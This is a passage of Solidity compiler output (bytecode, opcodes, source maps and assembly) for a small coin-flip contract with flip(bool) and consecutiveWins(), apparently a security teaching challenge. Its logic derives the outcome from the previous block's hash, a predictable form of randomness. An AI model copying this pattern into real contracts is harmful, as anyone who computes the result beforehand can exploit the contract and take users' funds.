15250610298565b905092915050565b6000838311158290610285576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561024a57808201518184015260208101905061022f565b50505050905090810190601f1680156102775780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b60008083118290610344576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156103095780820151818401526020810190506102ee565b50505050905090810190601f1680156103365780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b50600083858161035057fe5b04905080915050939250505056fea2646970667358221220d74fc45c4573c64c77ffcc7c1d298b625b36505fa39c1c1448ef7b4c37bdfa6a64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x394 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x81 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x69 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD ISZERO ISZERO SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x9F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x89 PUSH2 0x13E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xB6 PUSH1 0x1 NUMBER PUSH2 0x144 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xCB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xE9 PUSH1 0x2 SLOAD DUP4 PUSH2 0x18E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xFC JUMPI PUSH1 0x0 PUSH2 0xFF JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x139 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x186 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x1D8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D0 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x298 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x285 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x24A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x22F JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x277 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x344 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x309 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2EE JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x336 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x350 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD7 0x4F 0xC4 0x5C GASLIMIT PUSH20 0xC64C77FFCC7C1D298B625B36505FA39C1C1448EF PUSH28 0x4C37BDFA6A64736F6C634300060C0033000000000000000000000000 ",
							"sourceMap": "255:726:0:-:0;;;382:77;365:94;;466:53;;;;;;;;;;512:1;494:15;:19;;;;255:726;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d714610081575b600080fd5b6100696004803603602081101561005157600080fd5b8101908080351515906020019092919050505061009f565b60405180821515815260200191505060405180910390f35b61008961013e565b6040518082815260200191505060405180910390f35b6000806100b660014361014490919063ffffffff16565b4060001c90508060015414156100cb57600080fd5b8060018190555060006100e96002548361018e90919063ffffffff16565b90506000600182146100fc5760006100ff565b60015b9050841515811515141561012a57600080815480929190600101919050555060019350505050610139565b60008081905550600093505050505b919050565b60005481565b600061018683836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506101d8565b905092915050565b60006101d083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610298565b905092915050565b6000838311158290610285576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561024a57808201518184015260208101905061022f565b50505050905090810190601f1680156102775780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b60008083118290610344576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156103095780820151818401526020810190506102ee565b50505050905090810190601f1680156103365780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b50600083858161035057fe5b04905080915050939250505056fea2646970667358221220d74fc45c4573c64c77ffcc7c1d298b625b36505fa39c1c1448ef7b4c37bdfa6a64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x81 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x69 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD ISZERO ISZERO SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x9F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x89 PUSH2 0x13E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xB6 PUSH1 0x1 NUMBER PUSH2 0x144 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xCB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xE9 PUSH1 0x2 SLOAD DUP4 PUSH2 0x18E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xFC JUMPI PUSH1 0x0 PUSH2 0xFF JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x139 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x186 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x1D8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D0 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x298 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x285 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x24A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x22F JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x277 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x344 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x309 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2EE JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x336 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x350 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD7 0x4F 0xC4 0x5C GASLIMIT PUSH20 0xC64C77FFCC7C1D298B625B36505FA39C1C1448EF PUSH28 0x4C37BDFA6A64736F6C634300060C0033000000000000000000000000 ",
							"sourceMap": "255:726:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;525:453;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;309:30;;;:::i;:::-;;;;;;;;;;;;;;;;;;;525:453;568:4;581:18;620:19;637:1;620:12;:16;;:19;;;;:::i;:::-;610:30;602:39;;581:60;;666:10;654:8;;:22;650:53;;;687:8;;;650:53;722:10;711:8;:21;;;;739:16;758:22;773:6;;758:10;:14;;:22;;;;:::i;:::-;739:41;;787:9;811:1;799:8;:13;:28;;822:5;799:28;;;815:4;799:28;787:40;;848:6;840:14;;:4;:14;;;836:137;;;865:15;;:17;;;;;;;;;;;;;898:4;891:11;;;;;;;836:137;943:1;925:15;:19;;;;960:5;953:12;;;;;525:453;;;;:::o;309:30::-;;;;:::o;1274:134:1:-;1332:7;1358:43;1362:1;1365;1358:43;;;;;;;;;;;;;;;;;:3;:43::i;:::-;1351:50;;1274:134;;;;:::o;3033:130::-;3091:7;3117:39;3121:1;3124;3117:39;;;;;;;;;;;;;;;;;:3;:39::i;:::-;3110:46;;3033:130;;;;:::o;1692:187::-;1778:7;1810:1;1805;:6;;1813:12;1797:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1836:9;1852:1;1848;:5;1836:17;;1871:1;1864:8;;;1692:187;;;;;:::o;3638:338::-;3724:7;3821:1;3817;:5;3824:12;3809:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3847:9;3863:1;3859;:5;;;;;;3847:17;;3968:1;3961:8;;;3638:338;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "183200",
								"executionCost": "25246",
								"totalCost": "208446"
							},
							"external": {
								"consecutiveWins()": "1005",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 255,
									"end": 981,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 255,
									"end": 981,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 255,
									"end": 981,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 382,
									"end": 459,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 365,
									"end": 459,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 365,
									"end": 459,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 466,
									"end": 519,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 466,
									"end": 519,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 466,
									"end": 519,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 466,
									"end": 519,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 512,
									"end": 513,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 494,
									"end": 509,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 494,
									"end": 513,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 494,
									"end": 513,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 494,
									"end": 513,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 494,
									"end": 513,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 255,
									"end": 981,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 255,
									"end": 981,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 255,
									"end": 981,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 255,
									"end": 981,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 255,
									"end": 981,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 255,
									"end": 981,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 255,
									"end": 981,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220d74fc45c4573c64c77ffcc7c1d298b625b36505fa39c1c1448ef7b4c37bdfa6a64736f6c634300060c0033",
									".code": [
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 255,
											"end": 981,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 255,
											"end": 981,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
